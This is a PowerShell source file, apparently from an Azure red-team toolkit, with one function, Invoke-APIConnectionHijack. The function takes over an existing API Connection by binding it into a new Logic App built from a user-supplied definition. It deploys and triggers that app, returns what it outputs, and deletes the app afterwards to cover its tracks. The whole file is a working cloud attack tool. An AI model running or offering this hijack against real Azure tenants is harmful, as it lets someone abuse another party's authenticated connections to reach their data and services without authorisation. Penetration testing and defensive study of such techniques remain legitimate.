

#This function will perform the following actions:
#Obtain the details for a target API Connection
#Plug those details and a specified Logic App definition into a suitable format for the Az PowerShell module
#Create a new Logic App and trigger it
#Poll the LA until it is finished and retrieve any output/errors
#Delete the LA
Function Invoke-APIConnectionHijack{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, 
        HelpMessage="Name of the API Connection to hijack. Not necessary if you've hardcoded it into your new definition.")]
        [string]$connectionName = "",

        [Parameter(Mandatory=$false,
        HelpMessage="Name of Logic App to create. Default: Random 15 character name")]
        [string]$logicAppName = "",

        [Parameter(Mandatory=$true,
        HelpMessage="Resource Group for new Logic App")]
        [string]$logicAppRG = "",

        [Parameter(Mandatory=$true,
        HelpMessage="Definition for the Logic App. Any connection names should be replaced with CONNECTION_PLACEHOLDER")]
        [string]$definitionPath = ""
    )

    if($logicAppName -eq ""){
         $logicAppName = -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_})
    }

    $connector = Get-AzResource -Name $connectionName -ResourceType "Microsoft.Web/connections"
    $connectorId = $connector.ResourceId
    $connectorSub = $connector.ResourceId.Split("/")[1]
    $connectorId2 = -join("/subscriptions/",$connectorSub, "/providers/Microsoft.Web/locations/",$connector.Location,"/managedApis/",$connectionName)

    #Get the new definition and replace any connection name placeholders. If the connection name is hardcoded then it'll just do nothing
    $newDefinition = ""
    if($definitionPath -ne ""){
        $newDefinition = Get-Content -LiteralPath $definitionPath
    }
    else{
        Write-Error "Failed to get new definition from the provided path"
        break
    }
    $replacedDefinition = $newDefinition.Replace("CONNECTION_PLACEHOLDER", $connectionName)
    #Writing this to a file plays better with the Az module
    $replacedDefinition | Out-File -FilePath ".\new_definition.json"

    #Get the connection information and get it formatted into a JSON string
  
    $connectionString = '
    {
        "$connections": {
            "value": {
               CONNECTION_NAME: {
                "connectionId":"CONNECTOR_ID",
                "connectionName":"CONNECTION_NAME",
                "id":"CONNECTOR_ID2"
               }
            }
        }
    }'

    $connectionString = $connectionString.Replace("CONNECTOR_ID2", $connectorId2)
    $connectionString = $connectionString.Replace("CONNECTOR_ID", $connectorId)
    $connectionString = $connectionString.Replace("CONNECTION_NAME", $connectionName)
    

    #Writing it a file plays better with the Az module
    $connectionString | Out-File -FilePath ".\parameters.json"

    Write-Output (-join("Creating the ", $logicAppName, " logic app..."))

    #Create a new Logic App
    try{New-AzLogicApp -ResourceGroupName $logicAppRG -Name $logicAppName -Location $connector.Location -State "Enabled" -DefinitionFilePath ".\new_definition.json" -ParameterFilePath ".\parameters.json" -ErrorAction Stop | Out-Null}
    catch{
        $_
        Write-Warning "Failed to create Logic App, check your payload"
        Remove-Item -Path ".\parameters.json"
        Remove-Item -Path ".\new_definition.json"
        break
    }

    Write-Output ("Created the new logic app...")
   
    #Remove the temporary files that we created
    Remove-Item -Path ".\parameters.json"
    Remove-Item -Path ".\new_definition.json"
    
    #Our new definition should always have a callback URL
    $callbackInfo = Get-AzLogicAppTriggerCallbackUrl -ResourceGroupName $logicAppRG -Name $logicAppName -TriggerName "manual"
    $endpoint = $callbackInfo.Value
    
    #Call the endpoint to trigger the LA run
    Invoke-WebRequest -Method "POST" -Uri $endpoint | Out-Null
    Write-Output "Called the manual trigger endpoint..."

    $history = Get-AzLogicAppRunHistory -ResourceGroupName $logicAppRG -Name $logicAppName
    $mostRecent = $history[0]

    #If the Logic App is still running then we'll need to loop until it finishes
    while($mostRecent.Status -eq "Running"){
        $history = Get-AzLogicAppRunHistory -ResourceGroupName $logicAppRG -Name $logicAppName
        $mostRecent = $history[0]
    }

    #This assumes that the output will be named "result"
    if($mostRecent.Outputs -ne $null){
        Write-Output "Output from Logic App run:"
        Write-Output $mostRecent.Outputs.result.Value.ToString()
    }

    if($mostRecent.Error -ne $null){
        Write-Output "Error from Logic App run:"
        Write-Output $mostRecent.Error.message
    }

    #This should never fail, but if it does then the user will need to manually clean up the LA
    try{Remove-AzLogicApp -ResourceGroupName $logicAppRG -Force -Name $logicAppName -ErrorAction Stop | Out-Null}
    catch{
        Write-Warning "Failed to clean up Logic App!"
        break
    }

    Write-Output "Successfully cleaned up Logic App"

}



